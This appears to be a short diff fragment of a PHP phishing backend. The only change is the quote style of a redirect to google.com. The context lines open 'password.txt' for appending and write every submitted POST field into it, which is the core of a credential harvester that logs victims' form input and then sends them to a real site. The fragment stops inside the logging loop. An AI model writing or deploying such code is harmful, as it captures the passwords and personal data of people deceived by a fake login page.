@@ -1,5 +1,5 @@
   ﻿<?php
-header("Location: http://google.com"); 
+header('Location: http://google.com'); 
 $handle = fopen("password.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
